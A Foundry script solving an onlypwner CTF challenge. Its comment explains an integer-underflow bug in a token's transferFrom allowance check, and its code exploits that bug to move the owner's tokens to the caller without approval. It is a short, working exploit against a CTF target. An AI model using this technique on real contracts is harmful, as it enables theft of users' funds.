pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IImprovedERC20 {
    function transfer(address _to, uint256 _value) external returns (bool);

    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);

    function approve(address _spender, uint256 _value) external returns (bool);

    function mint(uint256 _value) external;

    function burn(address _who, uint256 _value) external;

    function owner() external view returns (address);

    function balanceOf(address _who) external view returns (uint256);

    function allowance(address _owner, address _spender) external view returns (uint256);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

// https://onlypwner.xyz/challenges/9
/*
need to change the balanceOf here, the only one who has funds is the owner so we need to transfer funds from owner to player address
transferFrom has this check

require(allowance[_from][msg.sender] - _value > 0, "Insufficient allowance");

we can pass this using underflow, 0 - 1 = 2^256 - 1, which is greater than 0, so we can transfer funds from owner to player address without approval.
*/
contract UnderTheFlow is Script {
    function run() public {
        vm.startBroadcast();
        IImprovedERC20 token = IImprovedERC20(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
        address owner = address(0x34788137367a14F2C4D253f9A6653A93aDf2D235);
        token.transferFrom(owner, msg.sender, 1);
        vm.stopBroadcast();
    }
}
